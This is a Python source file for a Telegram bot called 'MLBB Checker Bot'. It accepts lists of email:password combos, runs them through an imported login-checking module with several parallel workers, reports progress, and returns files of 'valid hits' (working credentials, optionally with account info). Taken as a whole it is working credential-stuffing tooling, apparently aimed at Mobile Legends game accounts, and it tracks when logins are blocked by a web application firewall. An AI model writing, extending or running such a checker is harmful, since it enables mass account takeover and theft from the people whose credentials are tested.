import asyncio
import io
import os
import re
import tempfile
import threading
import time
import queue
from pathlib import Path

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ChatAction, ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ---- import your checker module ---------------------------------------------
import upass3 as checker

BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
ALLOWED_USERS = {
    int(x) for x in os.environ.get("ALLOWED_USERS", "").replace(" ", "").split(",") if x.strip().isdigit()
}
MAX_CONCURRENT_JOBS = int(os.environ.get("MAX_CONCURRENT_JOBS", "1"))

# job store: user_id -> list of running Job
JOBS: dict[int, list] = {}
JOBS_LOCK = threading.Lock()


# -----------------------------------------------------------------------------
# Helpers
# -----------------------------------------------------------------------------
def is_allowed(user_id: int) -> bool:
    if not ALLOWED_USERS:
        return True
    return user_id in ALLOWED_USERS


def parse_combos_from_text(text: str):
    out = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if ":" in line:
            a, p = line.split(":", 1)
        elif "|" in line:
            a, p = line.split("|", 1)
        else:
            continue
        a, p = a.strip(), p.strip()
        if a and p:
            out.append((a, p))
    return out


# -----------------------------------------------------------------------------
# Job runner (threads - checker uses sync playwright)
# -----------------------------------------------------------------------------
class Job:
    def __init__(self, user_id: int, chat_id: int, combos, workers: int,
                 with_info: bool, headless: bool, app: Application,
                 loop: asyncio.AbstractEventLoop, status_msg_id: int):
        self.user_id = user_id
        self.chat_id = chat_id
        self.combos = combos
        self.workers = workers
        self.with_info = with_info
        self.headless = headless
        self.app = app
        self.loop = loop
        self.status_msg_id = status_msg_id
        self.cancel = threading.Event()
        self.results = []
        self.started = time.time()
        self.thread = threading.Thread(target=self._run, daemon=True)

    def start(self):
        self.thread.start()

    # --- sync helpers called from worker thread ---
    def _run(self):
        try:
            self._run_checker()
        except Exception as e:
            self._safe_send(f"❌ Job crashed: `{e}`", parse_mode=ParseMode.MARKDOWN)
        finally:
            self._finalize()

    def _safe_send(self, text: str, parse_mode=None, reply_markup=None):
        try:
            fut = asyncio.run_coroutine_threadsafe(
                self.app.bot.send_message(
                    chat_id=self.chat_id, text=text,
                    parse_mode=parse_mode, reply_markup=reply_markup,
                ),
                self.loop,
            )
            return fut.result(timeout=30)
        except Exception:
            return None

    def _edit_status(self, text: str):
        try:
            fut = asyncio.run_coroutine_threadsafe(
                self.app.bot.edit_message_text(
                    chat_id=self.chat_id, message_id=self.status_msg_id,
                    text=text, parse_mode=ParseMode.MARKDOWN,
                ),
                self.loop,
            )
            return fut.result(timeout=30)
        except Exception:
            return None

    def _run_checker(self):
        # Build temp files for combos and results
        tmpdir = Path(tempfile.mkdtemp(prefix="mlchk_"))
        combo_path = tmpdir / "combos.txt"
        result_path = tmpdir / "results.txt"
        combo_path.write_text(
            "\n".join(f"{a}:{p}" for a, p in self.combos), encoding="utf-8"
        )

        # Redirect valid_full output to tmpdir to avoid /sdcard
        # We monkeypatch upass3.run's hardcoded path? Simpler: patch Path open
        # Instead, we intercept by reading results CSV from result_path.

        # Track progress via log_q
        # But `checker.run` prints logs to stdout and writes CSVs. To keep
        # things simple we redirect checker's stdout to a buffer and parse.

        import contextlib
        import sys

        buf = io.StringIO()

        # Monkeypatch the hardcoded sdcard path
        sdcard = Path("/sdcard/npa")
        try:
            sdcard.mkdir(parents=True, exist_ok=True)
        except Exception:
            pass

        # We need to intercept to know when each result is available.
        # Easiest: run checker.run in this thread and parse its CSV at the end,
        # plus send progress updates via a custom log callback.
        #
        # We'll temporarily wrap Checker.login to emit progress.
        original_login = checker.Checker.login
        parent = self

        def patched_login(self_c, account, password):
            r = original_login(self_c, account, password)
            if parent.cancel.is_set():
                raise KeyboardInterrupt("cancelled")
            parent.results.append(r)
            # progress update
            done = len(parent.results)
            total = len(parent.combos)
            elapsed = time.time() - parent.started
            rate = done / elapsed if elapsed > 0 else 0
            eta = (total - done) / rate if rate > 0 else 0
            icon = {"valid": "✅", "invalid": "❌", "waf": "🛡", "timeout": "⏱"}.get(r.status, "•")
            parent._edit_status(
                f"*Job running* `{done}/{total}`\n"
                f"Last: {icon} `{r.account}` → *{r.status}*\n"
                f"Rate: `{rate:.2f}/s` • ETA: `{eta:.0f}s`"
            )
            return r

        checker.Checker.login = patched_login

        try:
            with contextlib.redirect_stdout(buf):
                checker.run(
                    infile=combo_path,
                    outfile=result_path,
                    workers=self.workers,
                    headless=self.headless,
                    with_info=self.with_info,
                    devices_file="/sdcard/npa/devices.txt",
                )
        finally:
            checker.Checker.login = original_login

        # parse results CSV
        # (already have self.results from patched_login - more reliable)
        self._send_results(tmpdir)

    def _finalize(self):
        with JOBS_LOCK:
            lst = JOBS.get(self.user_id, [])
            if self in lst:
                lst.remove(self)

    def _send_results(self, tmpdir: Path):
        # Build summary
        counts: dict[str, int] = {}
        for r in self.results:
            counts[r.status] = counts.get(r.status, 0) + 1

        lines = [
            f"*Job complete*",
            f"Checked: `{len(self.results)}`",
            f"Valid: `{counts.get('valid', 0)}`",
            f"Invalid: `{counts.get('invalid', 0)}`",
            f"WAF: `{counts.get('waf', 0)}`",
            f"Timeout: `{counts.get('timeout', 0)}`",
        ]
        self._edit_status("\n".join(lines))

        # Valid hits file
        valid = [r for r in self.results if r.status == "valid"]
        if valid:
            txt = "\n".join(
                f"{r.account}:{r.password}"
                + (f" | {r.info}" if r.info else "")
                for r in valid
            )
            buf = io.BytesIO(txt.encode("utf-8"))
            buf.name = "valid.txt"
            try:
                fut = asyncio.run_coroutine_threadsafe(
                    self.app.bot.send_document(
                        chat_id=self.chat_id,
                        document=buf,
                        caption=f"✅ {len(valid)} valid hits",
                        filename="valid.txt",
                    ),
                    self.loop,
                )
                fut.result(timeout=60)
            except Exception as e:
                self._safe_send(f"Failed to send valid.txt: `{e}`")

        # Full results CSV
        csv_buf = io.StringIO()
        import csv as _csv
        w = _csv.writer(csv_buf)
        w.writerow(["account", "password", "status", "info"])
        for r in self.results:
            w.writerow([r.account, r.password, r.status, r.info])
        data = io.BytesIO(csv_buf.getvalue().encode("utf-8"))
        data.name = "results.csv"
        try:
            fut = asyncio.run_coroutine_threadsafe(
                self.app.bot.send_document(
                    chat_id=self.chat_id,
                    document=data,
                    caption="📄 Full results",
                    filename="results.csv",
                ),
                self.loop,
            )
            fut.result(timeout=60)
        except Exception as e:
            self._safe_send(f"Failed to send results.csv: `{e}`")


# -----------------------------------------------------------------------------
# Handlers
# -----------------------------------------------------------------------------
WELCOME = (
    "*MLBB Checker Bot*\n\n"
    "Send me a `.txt` file with combos, or paste them.\n"
    "Format: `email:password` (one per line)\n\n"
    "*Commands*\n"
    "/start — show this\n"
    "/check — instructions\n"
    "/info — toggle info fetch (default OFF)\n"
    "/workers N — set workers (default 3)\n"
    "/status — show running jobs\n"
    "/cancel — cancel all your jobs\n"
)


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        await update.message.reply_text("⛔ Not authorized.")
        return
    ctx.user_data.setdefault("with_info", False)
    ctx.user_data.setdefault("workers", 3)
    await update.message.reply_text(WELCOME, parse_mode=ParseMode.MARKDOWN)


async def cmd_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    await update.message.reply_text(
        "Send a `.txt` file or paste combos (`email:password` per line).",
    )


async def cmd_info(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    cur = ctx.user_data.get("with_info", False)
    ctx.user_data["with_info"] = not cur
    await update.message.reply_text(
        f"Info fetch: *{'ON' if not cur else 'OFF'}*\n"
        f"({'slower, needs zstandard+cryptography' if not cur else 'fast mode'})",
        parse_mode=ParseMode.MARKDOWN,
    )


async def cmd_workers(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    if not ctx.args:
        await update.message.reply_text("Usage: `/workers 3`", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        n = int(ctx.args[0])
        assert 1 <= n <= 10
    except Exception:
        await update.message.reply_text("Workers must be 1–10.")
        return
    ctx.user_data["workers"] = n
    await update.message.reply_text(f"Workers set to *{n}*", parse_mode=ParseMode.MARKDOWN)


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    with JOBS_LOCK:
        jobs = JOBS.get(update.effective_user.id, [])
    if not jobs:
        await update.message.reply_text("No running jobs.")
        return
    lines = []
    for j in jobs:
        done = len(j.results)
        total = len(j.combos)
        lines.append(f"• `{done}/{total}` ({time.time()-j.started:.0f}s)")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)


async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    with JOBS_LOCK:
        jobs = JOBS.get(update.effective_user.id, [])
    for j in jobs:
        j.cancel.set()
    await update.message.reply_text(f"Cancelled {len(jobs)} job(s).")


async def _start_job(update: Update, ctx: ContextTypes.DEFAULT_TYPE, combos):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    with JOBS_LOCK:
        running = JOBS.get(user_id, [])
        if len(running) >= MAX_CONCURRENT_JOBS:
            await update.message.reply_text(
                f"⏳ You already have {len(running)} running job(s). "
                f"Wait or /cancel."
            )
            return

    workers = ctx.user_data.get("workers", 3)
    with_info = ctx.user_data.get("with_info", False)

    msg = await update.message.reply_text(
        f"🚀 Starting job\n"
        f"Combos: `{len(combos)}`\n"
        f"Workers: `{workers}`\n"
        f"Info: `{'ON' if with_info else 'OFF'}`",
        parse_mode=ParseMode.MARKDOWN,
    )

    loop = asyncio.get_running_loop()
    job = Job(
        user_id=user_id, chat_id=chat_id, combos=combos,
        workers=workers, with_info=with_info, headless=True,
        app=ctx.application, loop=loop, status_msg_id=msg.message_id,
    )
    with JOBS_LOCK:
        JOBS.setdefault(user_id, []).append(job)
    job.start()


async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    doc = update.message.document
    if not doc:
        return
    await update.message.chat.send_action(ChatAction.TYPING)
    f = await doc.get_file()
    data = await f.download_as_bytearray()
    text = data.decode("utf-8", errors="ignore")
    combos = parse_combos_from_text(text)
    if not combos:
        await update.message.reply_text("No valid combos found in file.")
        return
    await _start_job(update, ctx, combos)


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        return
    text = update.message.text or ""
    combos = parse_combos_from_text(text)
    if not combos:
        await update.message.reply_text(
            "No valid combos. Send `email:password` per line.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return
    await _start_job(update, ctx, combos)


# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------
def main():
    if not BOT_TOKEN:
        raise SystemExit("BOT_TOKEN env var is required")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_start))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("info", cmd_info))
    app.add_handler(CommandHandler("workers", cmd_workers))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    print("Bot starting...")
    app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()